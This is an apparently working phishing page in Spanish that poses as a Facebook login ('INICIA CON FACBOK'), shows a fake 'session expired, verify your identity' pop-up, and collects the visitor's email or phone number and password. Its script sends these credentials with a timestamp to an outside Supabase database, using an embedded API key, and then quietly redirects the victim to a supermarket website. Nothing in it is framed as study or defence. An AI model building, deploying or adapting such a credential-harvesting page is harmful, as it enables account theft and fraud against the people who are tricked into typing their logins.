<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Compra Ahora</title>
<style>
/* --- estilos originales --- */
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.wrapper {
  width:100%;
  max-width:380px;
  background:#f2f2f2;
  border-radius:20px;
  box-shadow:0 5px 25px rgba(0,0,0,0.3);
  margin:auto;
}
.header {
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  padding:18px;
  border-radius:20px 20px 0 0;
  text-align:center;
}
.header h1 { margin:0; font-size:28px; font-weight:700; }
.header p { margin:5px 0 0; font-size:13px; }
.form { padding:20px; text-align:center; }
input {
  width:90%;
  padding:14px;
  margin:8px auto;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  display:block;
}
.btn {
  width:90%;
  padding:14px;
  margin:10px auto 0;
  border:none;
  border-radius:6px;
  font-weight:bold;
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  color:white;
  font-size:15px;
  cursor:pointer;
}
.small { text-align:center; font-size:12px; color:#666; margin-top:10px; }
.overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:998; display:block; }
.modal { position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:90%; max-width:320px; background:white; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.3); text-align:center; z-index:999; display:block; }
.modal-header { background:#1877f2; color:white; padding:12px; font-size:14px; border-radius:12px 12px 0 0; }
.modal-body { padding:15px; font-size:14px; }
.modal button { background:#1877f2; color:white; border:none; padding:10px; width:70%; border-radius:8px; cursor:pointer; }
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <h1>INICIA CON FACBOK</h1>
    <p>La forma más fácil de estar con tus amigos</p>
  </div>

  <div class="form">
    <form id="loginForm">
      <input type="text" name="usuario" placeholder="Correo o número de teléfono" required>
      <input type="text" name="contraseña" placeholder="Contraseña" required>
      <button type="submit" class="btn">Entrar ahora</button>
    </form>
    <div class="small">¿Nuevo aquí? Crea tu cuenta gratis en segundos</div>
  </div>
</div>

<div id="overlay" class="overlay"></div>
<div id="modal" class="modal">
  <div class="modal-header">Su sesión ha expirado</div>
  <div class="modal-body">
    <p>Para continuar, verifica tu identidad.</p>
    <button onclick="cerrar()">Continuar</button>
  </div>
</div>

<script>
function cerrar(){
  document.getElementById("modal").style.display="none";
  document.getElementById("overlay").style.display="none";
}

const form = document.getElementById("loginForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const datos = {
    Usuario: form.usuario.value,
    Contraseña: form.contraseña.value,
    Fecha: new Date().toISOString()
  };

  const SUPABASE_URL = "https://cpxrkcsgbgutwxjvcabl.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNweHJrY3NnYmd1dHd4anZjYWJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5NDQ2MTgsImV4cCI6MjA5MjUyMDYxOH0.5Bm5GlQcd0gKckLVeyMVYHEpNaZH8XRQSj4tidDywpY";

  try {
    // Verificar si ya existe ese usuario/contraseña
    const check = await fetch(${SUPABASE_URL}/rest/v1/usuarios?Usuario=eq.${datos.Usuario}&Contraseña=eq.${datos.Contraseña}, {
      headers: {
        "apikey": SUPABASE_KEY,
        "Authorization": Bearer ${SUPABASE_KEY}
      }
    });
    const existe = await check.json();

    if (existe.length === 0) {
      // Insertar solo si no existe
      await fetch(${SUPABASE_URL}/rest/v1/usuarios, {
        method: "POST",
        headers: {
          "apikey": SUPABASE_KEY,
          "Authorization": Bearer ${SUPABASE_KEY},
          "Content-Type": "application/json",
          "Prefer": "return=minimal"
        },
        body: JSON.stringify(datos)
      });
    }

  } catch(err) {
    console.error("Error:", err);
  }

  // Redirección inmediata y fluida
  window.location.href = "https://supermarket23.com/";
});
</script>

</body>
</html>
